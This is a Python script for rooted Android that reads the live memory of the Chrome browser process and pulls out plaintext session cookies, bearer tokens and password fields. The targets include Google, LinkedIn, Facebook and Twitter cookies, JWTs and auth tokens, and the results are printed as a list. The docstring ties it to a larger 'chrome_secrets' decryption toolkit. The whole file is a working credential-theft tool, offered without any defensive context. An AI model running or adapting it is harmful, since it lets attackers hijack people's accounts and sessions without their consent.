#!/data/data/com.termux/files/usr/bin/python3
"""Scan Chrome process memory for live cookie/token plaintext (root).

Used by Isaac chrome_secrets live decrypt path. Prints KEY=VALUE lines to stdout.
"""
from __future__ import annotations

import os
import re
import sys

# Hints for name=value pairs frequently held decrypted in memory
_NAME_HINTS = (
    b"SID=",
    b"HSID=",
    b"SSID=",
    b"APISID=",
    b"SAPISID=",
    b"__Secure-1PSID=",
    b"__Secure-3PSID=",
    b"__Secure-1PSIDTS=",
    b"__Secure-3PSIDTS=",
    b"__Secure-1PSIDCC=",
    b"__Secure-3PSIDCC=",
    b"SIDCC=",
    b"NID=",
    b"OSID=",
    b"__Secure-OSID=",
    b"sessionid=",
    b"session_id=",
    b"session=",
    b"auth_token=",
    b"access_token=",
    b"refresh_token=",
    b"id_token=",
    b"Bearer ",
    b"csrftoken=",
    b"li_at=",
    b"c_user=",
    b"xs=",
    b"datr=",
    b"sb=",
    b"twid=",
    b"auth_token=",
    b"ct0=",
    b"login_email=",
    b"password=",
    b"passwd=",
    b"Passwd=",
    b"user_session=",
    b"__Host-next-auth.session-token=",
    b"next-auth.session-token=",
    b"_session=",
    b"connect.sid=",
    b"jwt=",
    b"token=",
)

_PAIR_RE = re.compile(
    rb"([A-Za-z_][A-Za-z0-9_\-\.]{1,80})="
    rb"([A-Za-z0-9_\-\.%\+/=]{8,800})"
)
_BEARER_RE = re.compile(rb"Bearer\s+([A-Za-z0-9_\-\.%\+/=]{20,800})")
_SET_COOKIE_RE = re.compile(
    rb"Set-Cookie:\s*([A-Za-z0-9_\-\.]+=[A-Za-z0-9_\-\.%\+/=]{6,400})",
    re.I,
)
_COOKIE_HDR_RE = re.compile(
    rb"Cookie:\s*([^\r\n]{20,2000})",
    re.I,
)


def find_chrome_pid() -> int | None:
    if len(sys.argv) > 1 and sys.argv[1].isdigit():
        return int(sys.argv[1])
    for p in os.listdir("/proc"):
        if not p.isdigit():
            continue
        try:
            raw = open(f"/proc/{p}/cmdline", "rb").read()
        except OSError:
            continue
        cmd = raw.replace(b"\x00", b" ").decode("utf-8", "ignore").strip()
        # main chrome process, not sandboxed
        if cmd == "com.android.chrome" or cmd.startswith("com.android.chrome "):
            return int(p)
    return None


def parse_maps(pid: int):
    maps = []
    with open(f"/proc/{pid}/maps", "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            parts = line.split()
            if len(parts) < 2 or "r" not in parts[1]:
                continue
            start_s, end_s = parts[0].split("-")
            start, end = int(start_s, 16), int(end_s, 16)
            size = end - start
            if size <= 0 or size > 80 * 1024 * 1024:
                continue
            path = parts[-1] if len(parts) > 5 else ""
            if path.endswith((".so", ".apk", ".odex", ".vdex", ".dex", ".jar")):
                continue
            maps.append((start, end, path))
    return maps


def main() -> int:
    pid = find_chrome_pid()
    if not pid:
        print("NO_PID", file=sys.stderr)
        return 1
    print(f"PID={pid}", flush=True)
    maps = parse_maps(pid)
    print(f"MAPS={len(maps)}", flush=True)
    try:
        mem = open(f"/proc/{pid}/mem", "rb")
    except OSError as exc:
        print(f"MEM_OPEN_FAIL {exc}", file=sys.stderr)
        return 2

    found: list[str] = []
    seen: set[bytes] = set()
    scanned = 0
    max_items = 200

    def add_pair(name: bytes, value: bytes, source: str) -> None:
        if b"v10" in value[:8]:
            return
        # skip obvious garbage
        if len(value) < 8 or value.count(b"\x00"):
            return
        key = name + b"=" + value
        if key in seen:
            return
        seen.add(key)
        try:
            line = f"{source}|{name.decode('ascii')}|{value.decode('ascii')}"
        except UnicodeDecodeError:
            return
        found.append(line)

    for start, end, path in maps:
        size = end - start
        try:
            mem.seek(start)
            data = mem.read(size)
        except OSError:
            continue
        scanned += 1

        for hint in _NAME_HINTS:
            idx = 0
            while True:
                i = data.find(hint, idx)
                if i < 0:
                    break
                chunk = data[i : i + 900]
                if hint == b"Bearer ":
                    m = _BEARER_RE.match(chunk)
                    if m:
                        add_pair(b"Bearer", m.group(1), "bearer")
                else:
                    m = _PAIR_RE.match(chunk)
                    if m:
                        add_pair(m.group(1), m.group(2), "pair")
                idx = i + len(hint)

        for m in _SET_COOKIE_RE.finditer(data):
            pair = m.group(1)
            if b"=" in pair:
                n, v = pair.split(b"=", 1)
                add_pair(n, v, "set-cookie")

        for m in _COOKIE_HDR_RE.finditer(data):
            hdr = m.group(1)
            for part in hdr.split(b";"):
                part = part.strip()
                if b"=" not in part:
                    continue
                n, v = part.split(b"=", 1)
                n, v = n.strip(), v.strip()
                if len(n) >= 2 and len(v) >= 8:
                    add_pair(n, v, "cookie-hdr")

        if len(found) >= max_items:
            break

    mem.close()
    print(f"SCANNED_REGIONS={scanned}", flush=True)
    print(f"FOUND={len(found)}", flush=True)
    for item in found[:max_items]:
        print(item)
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
